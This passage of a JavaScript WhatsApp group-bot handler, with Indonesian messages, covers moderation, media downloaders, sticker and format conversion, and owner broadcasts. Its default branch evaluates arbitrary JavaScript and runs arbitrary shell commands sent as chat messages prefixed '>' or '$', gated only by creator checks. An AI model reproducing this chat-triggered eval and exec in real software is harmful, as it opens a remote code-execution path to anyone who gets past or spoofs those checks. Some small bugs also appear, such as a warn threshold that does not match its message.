          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (!m.quoted) throw `Reply pesan`;
          db.read()
          totalwarn = db.data.users[m.quoted.sender].warn
          if(totalwarn > 3 ){
            //Jika Warn Sudah Mencapai 3
            await RssDev.groupParticipantsUpdate(m.chat, m.quoted.sender, "remove")
            await RssDev.sendMessage(m.chat, `Kamu Mendapatkan 3 Peringatan, Kami di kick`, { quoted: m.quoted }
          );

          }else{
            db.read()
            db.data.users[m.quoted.sender].warn += 1
            db.write()
            db.read()
            totalwarn2 = db.data.users[m.quoted.sender].warn
            await RssDev.sendMessage(m.chat, `Kamu Mendapatkan Peringatan ${totalwarn2}/3. Jika Mencapai 3 maka kami akan di ban dan di kick`)
          }
      }
      break
      case "setwelcome":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (args[0] === "on") {
            if (db.data.chats[m.chat].welcome)
              return m.reply(`*Sudah Aktif kak Sebelumnya*`);
            db.data.chats[m.chat].welcome = true;
            m.reply(`*welcome Sekarang Aktif !*`);
            db.write();
          } else if (args[0] === "off") {
            if (!db.data.chats[m.chat].welcome)
              return m.reply(`*Sudah Tidak Aktif Sebelumnya*`);
            db.data.chats[m.chat].welcome = false;
            m.reply(`*welcome Sekarang Tidak Aktif !*`);
            db.write();
          } else {
            let buttons = [
              {
                buttonId: "welcome on",
                buttonText: { displayText: "On" },
                type: 1,
              },
              {
                buttonId: "welcome off",
                buttonText: { displayText: "Off" },
                type: 1,
              },
            ];
            await RssDev.sendButtonText(
              m.chat,
              buttons,
              `Mode Welcome dan Leave`,
              RssDev.user.name,
              m
            );
          }
        }
        break;
      case "welcome":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (!text) throw "Text ?";
          db.data.chats[m.chat].welcome_text = text;
          m.reply("Pesan Selamat Datang Telah Di Atur");
        }
        break;
      case "kick":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let users = m.mentionedJid[0]
            ? m.mentionedJid
            : m.quoted
            ? [m.quoted.sender]
            : [text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"];
          await RssDev.groupParticipantsUpdate(m.chat, users, "remove")
            .then((res) => m.reply(jsonformat(res)))
            .catch((err) => m.reply(jsonformat(err)));
        }
        break;
      case "add":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let users = m.mentionedJid[0]
            ? m.mentionedJid
            : m.quoted
            ? [m.quoted.sender]
            : [text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"];
          await RssDev.groupParticipantsUpdate(m.chat, users, "add")
            .then((res) => m.reply(jsonformat(res)))
            .catch((err) => m.reply(jsonformat(err)));
        }
        break;
      case "promote":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let users = m.mentionedJid[0]
            ? m.mentionedJid
            : m.quoted
            ? [m.quoted.sender]
            : [text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"];
          await RssDev.groupParticipantsUpdate(m.chat, users, "promote")
            .then((res) => m.reply(jsonformat(res)))
            .catch((err) => m.reply(jsonformat(err)));
        }
        break;
      case "demote":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let users = m.mentionedJid[0]
            ? m.mentionedJid
            : m.quoted
            ? [m.quoted.sender]
            : [text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"];
          await RssDev.groupParticipantsUpdate(m.chat, users, "demote")
            .then((res) => m.reply(jsonformat(res)))
            .catch((err) => m.reply(jsonformat(err)));
        }
        break;
      case "readmore":{
        if (!text) throw `.readmore aku|kamu`
        let [ l, r ] = text.split`|`
        if (!l) l = ''
        if (!r) r = ''
        jj = ''
        await m.reply(m.chat, l + jj + r, m)
      }
      break
      ///List Menu For
      case "listonline":
      case "liston":
        {
          let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
          let online = [...Object.keys(store.presences[id]), botNumber];
          RssDev.sendText(
            m.chat,
            "List Online:\n\n" +
              online.map((v) => "⭔ @" + v.replace(/@.+/, "")).join`\n`,
            m,
            { mentions: online }
          );
        }
        break;

      case "play":
      case "ytplay":
        {
          
          if (!text) throw `Example : ${prefix + command} story wa anime`;
          let yts = require("yt-search");
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let search = await yts(text);
          let anu =
            search.videos[Math.floor(Math.random() * search.videos.length)];
          let buttons = [
            {
              buttonId: `.ytmp3 ${anu.url}`,
              buttonText: { displayText: "♫ Audio" },
              type: 1,
            },
            {
              buttonId: `.ytmp4 ${anu.url}`,
              buttonText: { displayText: "► Video" },
              type: 1,
            },
            { buttonId: `.menu`, buttonText: { displayText: "Menu" }, type: 1 },
          ];
          let buttonMessage = {
            image: { url: anu.thumbnail },
            caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
            footer: "Rssdev Bot",
            buttons: buttons,
            headerType: 4,
          };
          RssDev.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "ytmp3":
      case "ytaudio":
        {
          let { yta } = require("./lib/y2mate");
          if (!text)
            throw `Example : ${
              prefix + command
            } https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`;
          let quality = args[1] ? args[1] : "128kbps";
          let media = await yta(text, quality);
          if (media.filesize >= 100000)
            return m.reply("File Melebihi Batas " + util.format(media));
          RssDev.sendImage(
            m.chat,
            media.thumb,
            `⭔ Title : ${media.title}\n⭔ File Size : ${
              media.filesizeF
            }\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${
              args[1] || "128kbps"
            }`,
            m
          );
          RssDev.sendMessage(
            m.chat,
            {
              audio: { url: media.dl_link },
              mimetype: "audio/mpeg",
              fileName: `${media.title}.mp3`,
            },
            { quoted: m }
          );
        }
        break;
      case "ytmp4":
      case "ytvideo":
        {
          let { ytv } = require("./lib/y2mate");
          if (!text)
            throw `Example : ${
              prefix + command
            } https://youtube.com/watch?v=PtFMh6Tccag%27 360p`;
          let quality = args[1] ? args[1] : "360p";
          let media = await ytv(text, quality);
          if (media.filesize >= 100000)
            return m.reply("File Melebihi Batas " + util.format(media));
          await RssDev.sendMessage(
            m.chat,
            {
              video: { url: media.dl_link },
              mimetype: "video/mp4",
              fileName: `${media.title}.mp4`,
              caption: `⭔ Title : ${media.title}\n⭔ File Size : ${
                media.filesizeF
              }\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${
                args[1] || "360p"
              }`,
            },
            { quoted: m }
          );
        }
        break;
      case "tiktok":
        {
          //https://api.neoxr.my.id/api/tiktok?url=https://vt.tiktok.com/ZSJ7CgDUC&apikey=acuyxzyyy
          //let dwnld = await RssDev.downloadMediaMessage(qmsg)
          //console.log(dwnld)
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let anu = await fetchJson(
            "https://api.neoxr.my.id/api/tiktok?url=" +
              text +
              "&apikey=" +
              global.keyneor
          );
          m.reply(`Tiktok To Link
videoWM : ${anu.data.videoWM}
vidio : ${anu.data.video}
music : ${anu.data.audio}
`);
        }
        break;
      case "ig":
        {
          //https://api.neoxr.my.id/api/tiktok?url=https://vt.tiktok.com/ZSJ7CgDUC&apikey=acuyxzyyy
          //let dwnld = await RssDev.downloadMediaMessage(qmsg)
          //console.log(dwnld)
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let anu = await fetchJson(
            "https://api.neoxr.my.id/api/ig?url=" +
              text +
              "&apikey=" +
              global.keyneor
          );
          m.reply(anu.data[0].url);
        }
        break;

      //Pencarian

      case "gimage":
        {
          if(!removelimit(m.sender, 1)) throw mess.limit;
          if (!text) throw `Example : .gimage + command} kaori cicak`;
          let gis = require("g-i-s");
          gis(text, async (error, result) => {
            n = result;
            images = n[Math.floor(Math.random() * n.length)].url;
            let buttons = [
              {
                buttonId: `Gimage ${text}`,
                buttonText: { displayText: "Next Image" },
                type: 1,
              },
            ];
            let buttonMessage = {
              image: { url: images },
              caption: `*-------「 RssDev SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
              footer: "6",
              buttons: buttons,
              headerType: 4,
            };
            RssDev.sendMessage(m.chat, buttonMessage, { quoted: m });
          });
        }
        break;
      case "meme":
        {
          if(!removelimit(m.sender, 1)) throw mess.limit;
          //ar = n[Math.floor(Math.random() * n.length)].url;
          ar = Math.floor(Math.random() * 100);
          let anu = await fetchJson("https://api.imgflip.com/get_memes");
          let anu2 = anu.data.memes;

          ars = anu2[Math.floor(Math.random() * anu2.length)];
          await sleep(2);
          RssDev.sendMessage(
            m.chat,
            { image: { url: ars.url }, caption: ars.name },
            { quoted: m }
          );
        }
        break;
      //Menu Media
      case "tourl":
        {
          m.reply(mess.wait);
          let {
            UploadFileUgu,
            webp2mp4File,
            TelegraPh,
          } = require("./lib/uploader");
          let media = await RssDev.downloadAndSaveMediaMessage(qmsg);
          if (/image/.test(mime)) {
            let anu = await TelegraPh(media);
            m.reply(util.format(anu));
          } else if (!/image/.test(mime)) {
            let anu = await UploadFileUgu(media);
            m.reply(util.format(anu));
          }
          await fs.unlinkSync(media);
        }
        break;
      case "sticker":
      case "s":
        {
          if(!removelimit(m.sender, 1)) throw mess.limit;
          if (/image/.test(mime)) {
            m.reply(mess.wait);
            let media = await RssDev.downloadMediaMessage(qmsg);
            console.log(media);
            await RssDev.sendImageAsSticker(m.chat, media, m, {
              packname: global.packname,
              author: global.author,
            });
          } else if (/video/.test(mime)) {
            m.reply(mess.wait);
            if (qmsg.seconds > 11) return m.reply("Maksimal 10 detik!");
            let media = await RssDev.downloadMediaMessage(qmsg);
            let encmedia = await RssDev.sendVideoAsSticker(m.chat, media, m, {
              packname: global.packname,
              author: global.author,
            });
            await fs.unlinkSync(encmedia);
          } else {
            m.reply(
              `Kirim/reply gambar/video/gif dengan caption ${
                prefix + command
              }\nDurasi Video/Gif 1-9 Detik`
            );
          }
        }
        break;
      case "tovideo":
        {
          if (!/webp/.test(mime))
            throw `Reply stiker dengan caption *${prefix + command}*`;
          m.reply(mess.wait);
          let { webp2mp4File } = require("./lib/uploader");
          let media = await RssDev.downloadAndSaveMediaMessage(qmsg);
          let webpToMp4 = await webp2mp4File(media);
          await RssDev.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
            },
            { quoted: m }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "toaud":
      case "toaudio":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${
              prefix + command
            }`;
          m.reply(mess.wait);
          let media = await RssDev.downloadMediaMessage(qmsg);
          let { toAudio } = require("./lib/converter");
          let audio = await toAudio(media, "mp4");
          RssDev.sendMessage(
            m.chat,
            { audio: audio, mimetype: "audio/mpeg" },
            { quoted: m }
          );
        }
        break;
      case "tomp3":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${
              prefix + command
            }`;
          m.reply(mess.wait);
          let media = await RssDev.downloadMediaMessage(qmsg);
          let { toAudio } = require("./lib/converter");
          let audio = await toAudio(media, "mp4");
          RssDev.sendMessage(
            m.chat,
            {
              document: audio,
              mimetype: "audio/mpeg",
              fileName: `Convert By ${RssDev.user.name}.mp3`,
            },
            { quoted: m }
          );
        }
        break;

      case "toimg":
        {
          if (!/webp/.test(mime))
            throw `Reply sticker dengan caption *${prefix + command}*`;
          m.reply(mess.wait);
          let media = await RssDev.downloadAndSaveMediaMessage(qmsg);
          let ran = await getRandom(".png");
          exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media);
            if (err) throw err;
            let buffer = fs.readFileSync(ran);
            RssDev.sendMessage(m.chat, { image: buffer }, { quoted: m });
            fs.unlinkSync(ran);
          });
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${
              prefix + command
            }`;
          m.reply(mess.wait);
          let media = await RssDev.downloadMediaMessage(qmsg);
          let { toPTT } = require("./lib/converter");
          let audio = await toPTT(media, "mp4");
          RssDev.sendMessage(
            m.chat,
            { audio: audio, mimetype: "audio/mpeg", ptt: true },
            { quoted: m }
          );
        }
        break;
      case "togif":
        {
          if (!/webp/.test(mime))
            throw `Reply stiker dengan caption *${prefix + command}*`;
          m.reply(mess.wait);
          let { webp2mp4File } = require("./lib/uploader");
          let media = await RssDev.downloadAndSaveMediaMessage(qmsg);
          let webpToMp4 = await webp2mp4File(media);
          await RssDev.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
              gifPlayback: true,
            },
            { quoted: m }
          );
          await fs.unlinkSync(media);
        }
        break;

      //owner/creator menu
      case "bcgc":
      case "bcgroup":
        {
          if (!isCreator) throw mess.owner;
          if (!text)
            throw `Text mana?\n\nExample : ${prefix + command} fatih-san`;
          let getGroups = await RssDev.groupFetchAllParticipating();
          let groups = Object.entries(getGroups)
            .slice(0)
            .map((entry) => entry[1]);
          let anu = groups.map((v) => v.id);
          m.reply(
            `Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${
              anu.length * 1.5
            } detik`
          );
          for (let i of anu) {
            await sleep(1500);
            let btn = [
              {
                urlButton: {
                  displayText: "Creator",
                  url: "https://wa.me/6285748411847",
                },
              },
              {
                quickReplyButton: {
                  displayText: "Status Bot",
                  id: "infobot",
                },
              },
              {
                quickReplyButton: {
                  displayText: "Contact Owner",
                  id: "owner",
                },
              },
              {
                quickReplyButton: {
                  displayText: "Script",
                  id: "sc",
                },
              },
            ];
            let txt = `「 Broadcast Bot RssDev 」\n\n${text}`;
            RssDev.send5ButImg(i, txt, RssDev.user.name, global.thumb, btn);
          }
          m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`);
        }
        break;

      //Menu download
      case "ytmp3":
        {
          //https://kannxapi.herokuapp.com/api/youtube?url=https://youtu.be/5C8yvJUVB-0
        }
        break;
      default:
        if (budy.startsWith(">")) {
          if (!isCreator) return m.reply(mess.owner);
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await m.reply(evaled);
          } catch (err) {
            await m.reply(String(err));
          }
        }
        if (budy.startsWith("$")) {
          if (!isCret) return m.reply("Fitur Ini Hanya untuk creator");
          exec(budy.slice(1), (err, stdout) => {
            if (err) return m.reply(`${err}`);
            if (stdout) return m.reply(stdout);
          });
        }
    }
  } catch (err) {
    m.reply(util.format(err));
  }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});
